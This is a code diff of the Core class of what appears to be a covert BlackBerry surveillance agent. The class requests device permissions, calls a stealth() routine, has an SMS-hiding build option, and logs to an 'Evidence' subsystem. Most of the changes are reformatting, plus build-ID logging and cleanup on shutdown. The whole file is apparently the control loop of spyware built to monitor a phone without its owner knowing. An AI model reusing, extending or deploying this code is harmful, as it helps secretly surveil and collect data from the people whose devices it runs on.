@@ -16,13 +16,13 @@ import net.rim.device.api.applicationcontrol.ApplicationPermissionsManager;
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.CodeModuleGroup;
 import net.rim.device.api.system.CodeModuleGroupManager;
+import blackberry.config.Cfg;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
 import blackberry.utils.Utils;
-
 
 /**
  * Classe Core, contiene il main.
@@ -75,6 +75,7 @@ public final class Core implements Runnable {
         checkPermissions();
 
         task = Task.getInstance();
+        
         Utils.sleep(1000);
 
         final boolean antennaInstalled = true;
@@ -138,8 +139,8 @@ public final class Core implements Runnable {
 
         // Set up and attach a reason provider
         final CoreReasonProvider drp = new CoreReasonProvider();
-        apm.addReasonProvider(ApplicationDescriptor
-                .currentApplicationDescriptor(), drp);
+        apm.addReasonProvider(
+                ApplicationDescriptor.currentApplicationDescriptor(), drp);
 
         //int PERMISSION_INTERNET = 0x7;
         int PERMISSION_DISPLAY_LOCKED = 22;
@@ -164,9 +165,9 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_EXTERNAL_CONNECTIONS,                
                 //#ifdef SMS_HIDE
                 ApplicationPermissions.PERMISSION_CROSS_APPLICATION_COMMUNICATION,
-                //#endif
-                //PERMISSION_DISPLAY_LOCKED, // 22
-                };
+        //#endif
+        //PERMISSION_DISPLAY_LOCKED, // 22
+        };
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
@@ -174,13 +175,13 @@ public final class Core implements Runnable {
         for (int i = 0; i < wantedPermissions.length; i++) {
             final int perm = wantedPermissions[i];
 
-            try{
-            if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
-                allPermitted = false;
-            }
-            }catch(IllegalArgumentException ex){
+            try {
+                if (original.getPermission(perm) != ApplicationPermissions.VALUE_ALLOW) {
+                    allPermitted = false;
+                }
+            } catch (IllegalArgumentException ex) {
                 //#ifdef DEBUG
-                debug.error("checkPermissions: " + perm + " "+ex);
+                debug.error("checkPermissions: " + perm + " " + ex);
                 //#endif
             }
         }
@@ -188,8 +189,7 @@ public final class Core implements Runnable {
         if (allPermitted) {
             // All of the necessary permissions are currently available
             //#ifdef DEBUG
-            debug
-                    .info("All of the necessary permissions are currently available");
+            debug.info("All of the necessary permissions are currently available");
             //#endif
             return;
         }
@@ -220,7 +220,7 @@ public final class Core implements Runnable {
             debug.warn("User has accepted some or none of the permissions");
             //#endif
         }
-        
+
     }
 
     /**
@@ -228,14 +228,17 @@ public final class Core implements Runnable {
      * 
      * @return true, if successful
      */
-    public void run() { 
+    public void run() {
         //#ifdef DEBUG
         debug.info("START: " + (new Date()));
-        //#endif
+        Evidence.info("Start build:" + Cfg.BUILD_ID + " " + Cfg.BUILD_TIMESTAMP);
+        //#else
         Evidence.info("Start");
-   
+        //#endif
+       
+
         stealth();
-        Utils.sleep(500);     
+        Utils.sleep(500);
         try {
             for (;;) {
                 //#ifdef DEBUG
@@ -269,6 +272,8 @@ public final class Core implements Runnable {
                     Utils.sleep(2000);
                 }
             }
+
+            task.stopAll();
         } catch (final Exception ex) {
             //#ifdef DEBUG
             debug.error("run " + ex);
@@ -282,8 +287,12 @@ public final class Core implements Runnable {
             //#ifdef DEBUG
             Debug.stop();
             //#endif
+                        
 
             Utils.sleep(2000);
+            
+            Singleton.self().clear();
+            
             System.exit(0);
         }
     }
@@ -336,5 +345,7 @@ public final class Core implements Runnable {
             //#endif
         }
     }
+
+
 
 }
